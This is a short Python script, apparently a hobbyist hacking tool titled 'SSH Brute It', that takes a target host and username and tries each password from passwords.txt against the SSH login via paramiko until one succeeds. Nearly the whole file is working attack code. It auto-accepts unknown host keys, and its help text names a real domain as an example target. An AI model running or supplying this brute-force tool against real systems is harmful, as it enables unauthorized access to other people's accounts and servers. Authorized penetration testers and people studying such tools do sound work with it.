import sys
try:
    from pwn import *
    import paramiko
    import argparse
    import sys
except ModuleNotFoundError:
    print('\033[1m[\033[93m!]\033[91m Modules are not found..!!\n\033[92m[-] Try to run "pip install -r requirements.txt"\n')
    sys.exit()

try:
    import colorama
    colorama.init()
except ModuleNotFoundError:
    print('[!] Color module not found!!!\n[*] Try to run "pip install colorama"')
    sys.exit()

banner = """\033[1m\033[91m

\t\t   _____ _____ _    _   ____             _       _____ _   _
\t\t  / ____/ ____| |  | | |  _ \           | |     |_   _| | | |
\t\t | (___| (___ | |__| | | |_) |_ __ _   _| |_ ___  | | | |_| |
\t\t  \__  \___ \ |  __  | |  _ <| '__| | | | __/ _ \ | | | __| |
\t\t  ____) |___) | |  | | | |_) | |  | |_| | ||  __/_| |_| |_|_|
\t\t |_____/_____/|_|  |_| |____/|_|   \__,_|\__\___|_____|\__(_)
                       \t\t\033[93m- By L0u51f3r007

"""
print(banner)


def get_arguments():
    parser = argparse.ArgumentParser(description='A python tool to bruteforce SSH login.')
    parser.add_argument('-i', '--host', dest="host", help='Host name / IP address of the target [ex : hackerone.com or 127.0.0.1]')
    parser.add_argument('-u', '--username', dest="username", help='Provide username on which you want to perform brute force.')
    return parser.parse_args()


def brute_force(host, username):
    attempts = 1
    with open('passwords.txt', 'r') as password_list:
        for password in password_list:
            password = password.strip("\n")
            try:
                print("[{}] Attempting password: '{}'!".format(attempts, password))
                ssh_conn = paramiko.SSHClient()
                ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_conn.connect(hostname=host, username=username, password=password, timeout=1)
                ssh_conn.close()
                print("[>] Valid Password found: '{}'!".format(password))
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("[X] Invalid password!")
                attempts += 1


def main():
    options = get_arguments()
    brute_force(options.host, options.username)


if __name__ == "__main__":
    main()
